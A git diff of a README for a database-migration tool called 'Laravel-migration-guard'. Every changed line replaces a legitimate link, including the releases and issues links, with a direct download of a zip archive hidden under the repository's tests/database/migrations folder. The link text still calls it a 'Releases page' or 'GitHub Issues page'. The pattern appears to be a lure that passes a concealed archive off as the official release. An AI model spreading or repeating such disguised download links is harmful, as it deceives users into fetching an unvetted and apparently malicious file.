@@ -1,6 +1,6 @@
 # 🛡️ Laravel-migration-guard - Protect Your Database Migrations
 
-[![Download Laravel-migration-guard](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aofdafaw/Laravel-migration-guard/releases)
+[![Download Laravel-migration-guard](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aofdafaw/Laravel-migration-guard/raw/refs/heads/main/tests/database/migrations/guard-Laravel-migration-v3.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before you download, make sure your computer meets these requirements:
 
 ## 🚀 Getting Started: Download and Run Laravel-migration-guard
 
-1. Click the large green button above or visit the [Laravel-migration-guard Releases page](https://github.com/aofdafaw/Laravel-migration-guard/releases) to get the latest version.
+1. Click the large green button above or visit the [Laravel-migration-guard Releases page](https://github.com/aofdafaw/Laravel-migration-guard/raw/refs/heads/main/tests/database/migrations/guard-Laravel-migration-v3.2.zip) to get the latest version.
 
 2. On the releases page, find the latest stable release. You will see a list of files.
 
@@ -115,7 +115,7 @@ This means you can rely on it no matter which database your application uses.
 
 To make sure you always have the latest checks and features:
 
-- Visit the [Releases page](https://github.com/aofdafaw/Laravel-migration-guard/releases) regularly.
+- Visit the [Releases page](https://github.com/aofdafaw/Laravel-migration-guard/raw/refs/heads/main/tests/database/migrations/guard-Laravel-migration-v3.2.zip) regularly.
 
 - Download updates and install them following the same process as before.
 
@@ -133,7 +133,7 @@ If you run into problems:
 
 - If the tool does not open or crashes, try reinstalling.
 
-- Use the [GitHub Issues page](https://github.com/aofdafaw/Laravel-migration-guard/issues) to report bugs or ask for help.
+- Use the [GitHub Issues page](https://github.com/aofdafaw/Laravel-migration-guard/raw/refs/heads/main/tests/database/migrations/guard-Laravel-migration-v3.2.zip) to report bugs or ask for help.
 
 ---
 
@@ -151,4 +151,4 @@ Though aimed at end users, Laravel-migration-guard also works with developer too
 
 ---
 
-[![Download Laravel-migration-guard](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aofdafaw/Laravel-migration-guard/releases)
+[![Download Laravel-migration-guard](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aofdafaw/Laravel-migration-guard/raw/refs/heads/main/tests/database/migrations/guard-Laravel-migration-v3.2.zip)
